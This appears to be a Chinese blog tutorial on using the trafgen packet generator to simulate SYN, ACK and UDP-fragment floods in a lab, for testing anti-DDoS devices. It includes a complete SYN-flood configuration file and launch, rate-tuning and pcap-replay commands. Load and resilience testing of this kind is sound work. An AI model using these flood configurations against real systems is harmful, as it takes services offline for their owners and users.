---
title: 高性能流量生成工具trafgen(DDoS模拟)
layout: post
author: WenfengShi
category: 技术
tags: [network, security, tools]
---
> 因项目需要，要对主流的几家抗DDoS设备做测评，当然了最专业的是使用Spirent TestCenter，但受限于其他因素，最终决定搭建一个软件环境来进行相关的DDoS测试。

> 本文主要讲解的是如何使用trafgen工具发起DDoS攻击(syn flood, ack flood等等)  
  
> synflood攻击、ackflood攻击、UDP fragment攻击的详细配置文件见 [github ddos-dos-tools][1]  

## 工具选择
1. 开源的流量生成工具很多，可用于模拟DoS攻击的工具也不在少数，如hping、scapy（python库）等等，但均存在着不足，如性能不够，不能模拟DDoS攻击（攻击流IP和PORT不能动态变化）
2. 通过详细的对比测试（同hping、scapy、LOIC等对比测试，具体数据不宜公开），最后统一选择了**netsniff-ng**套件中的**trafgen**攻击，其在测试环境中可达到**24万pps**的SYNFLOOD攻击，是一款高速、多线程网络数据包生成工具
3. trafgen 工具能够动态生成攻击IP和端口号，能够通过配置文件动态修改攻击包的内容

## 简单使用

### 1. 安装
trafgen属于netsniff-ng套件，是一款linux下的工具，安装很方便，通过系统的在线安装工具即可完成安装，如centos下`yum install netsniff-ng`即可

### 2. 使用（SYN Flood攻击）
1. 工具的比较简单，主要是配置文件的编写，假设已经写好了一个synflood配置文件
- 键入命令`trafgen --cpp --dev ens33 --conf synflood.trafgen --verbose`即可发起攻击
- 进一步的还可通过`trafgen --cpp --dev ens33 --conf synflood.trafgen --verbose --gap 1000` （以毫秒为单位）来调节速度
- 进一步的还可通过`trafgen --cpp --dev ens33 --conf synflood.trafgen --verbose --kernel-pull 20` (默认10us）来调节速度
- 详细的可以`man trafgen`

2. 配置文件解读（以synflood.trafgen文件为例）
- *synflood.trafgen* 模版，trafgen就是通过该文件来生成特定的数据包的！看配置文件的注释基本能清除如何修改

```
/* TCP SYN attack ( 64byte )
 * Command example:
 *  trafgen --cpp --dev em2 --conf synflood.trafgen --verbose
 * Note: dynamic elements "drnd()" make trafgen slower
 */

#define ETH_P_IP	0x0800

#define SYN		(1 << 1)
#define ACK		(1 << 4)
#define ECN		(1 << 6)

{
  /* --- Ethernet Header --- */
  /* NEED ADJUST */
  // 0x00, 0x12, 0xc0, 0x02, 0xac, 0x56,  # MAC Destination
  // 0x00, 0x12, 0xc0, drnd(3),  # MAC Source
  0xf4, 0xe9, 0xd4, 0x8d, 0x04, 0x82, # MAC Destination
  0xf4, 0xe9, 0xd4, 0x8c, 0xe2, 0xa2, # MAC Source
  
  const16(ETH_P_IP),
  /* IPv4 Version, IHL, TOS */
  0b01000101, 0,
  /* IPv4 Total Len */
  const16(46),
  /* IPv4 Ident */
  drnd(2),
  //const16(2),

  /* IPv4 Flags, Frag Off */
  0b01000000, 0,
  /* IPv4 TTL */
  64,
  /* Proto TCP */
  0x06,
  /* IPv4 Checksum (IP header from, to) */
  csumip(14, 33),

  /* NEED ADJUST */
  // 10, 10, 88, drnd(1), # Source IP
  10, 10, 88, 173,  # Source IP
  10, 10, 88, 172, # Dest IP

  /* TCP Source Port */
  drnd(2),
  /* TCP Dest Port */
  const16(80),
  /* TCP Sequence Number */
  drnd(4),
  /* TCP Ackn. Number */
  const32(0), /* NOTICE ACK==zero with SYN packets */

  /* TCP Header length + Flags */
  //const16((0x5 << 12) | SYN | ECN)	/* TCP SYN+ECN Flag */
  //const16((0x5 << 12) | SYN | ACK)	/* TCP SYN+ACK Flag */
  const16((0x5 << 12) | SYN)		/* TCP SYN Flag */
  //const16((0x5 << 12) | ACK)		/* TCP ACK Flag */

  /* Window Size */
  const16(16),
  /* TCP Checksum (offset IP, offset TCP) */
  csumtcp(14, 34),
  const16(0), /*PAD*/
  
  /* Data */
  "SYNswf"
}
```

- 配置文件可通过`drnd()`函数来实现对应内容的动态生成，如IP、MAC地址等，但是会影响性能

![image_1b6bf8ooa3im1ioc1kc7aeu1qo89.png-6kB][2]

- 修改MAC地址（攻击/被攻击MAC地址）

![image_1b6bfeukr5m628h14ciupq1tnnm.png-11.8kB][3]

- 修改IP地址和攻击协议及端口号，`const16()`将对应的十进制数转换成一个16位的二进制数

![image_1b6bftaek14a4il1fp5l3dr5213.png-15kB][4]

- 修改位SYN标志(根据情况也可修改为其他的)

![image_1b6bfv9751ojs1g6klulc4jaak1g.png-11.6kB][5]

### 3. ACKFlood 攻击
- 配置文件见 [github ddos-dos-tools][6]

### 4. UDP fragment 攻击
- 配置文件见 [github ddos-dos-tools][7]

### 5. 退出命令
统一退出命令`pgrep trafgen | xargs kill -s 9`


## 其他
1. 在trafgen性能仍达不到要求的情况下，可通过netsniff-ng攻击进行流量回放，如下
- 先捕获synfloog攻击数据包
`netsniff-ng --in ens33 --out synflood.pcap --silent --verbose --filter 'ether src 00:50:56:ab:a5:3f'`
`trafgen --cpp --dev ens33 --conf synflood.trafgen --verbose`
- 再重放synflood攻击数据包
`netsniff-ng --in synflood.pcap --out ens33 --silent --prio-high --verbose`
2. 在用trafgen进行实时流量生成或者netsniff-ng重放时，还可通过工具`tc`进行流量控制，具体请见["linux流量控制工具tc](http://)一文，简单举例如下
![image_1b6bgp1mntnf15a61bppjvs1f7a1t.png-15.8kB][8]



  [1]: https://github.com/wenfengshi/ddos-dos-tools
  [2]: http://static.zybuluo.com/wuzhimang/mhfkf1drooxo2ua6ty5cceed/image_1b6bf8ooa3im1ioc1kc7aeu1qo89.png
  [3]: http://static.zybuluo.com/wuzhimang/c9tv8lr5a7elsipj8zwjl6tl/image_1b6bfeukr5m628h14ciupq1tnnm.png
  [4]: http://static.zybuluo.com/wuzhimang/hujkjhes3d7n42iptoaovv2o/image_1b6bftaek14a4il1fp5l3dr5213.png
  [5]: http://static.zybuluo.com/wuzhimang/28r16zkja4memce251azvmx4/image_1b6bfv9751ojs1g6klulc4jaak1g.png
  [6]: https://github.com/wenfengshi/ddos-dos-tools
  [7]: https://github.com/wenfengshi/ddos-dos-tools
  [8]: http://static.zybuluo.com/wuzhimang/b16skp1a811ullz8hfuzq0h0/image_1b6bgp1mntnf15a61bppjvs1f7a1t.png
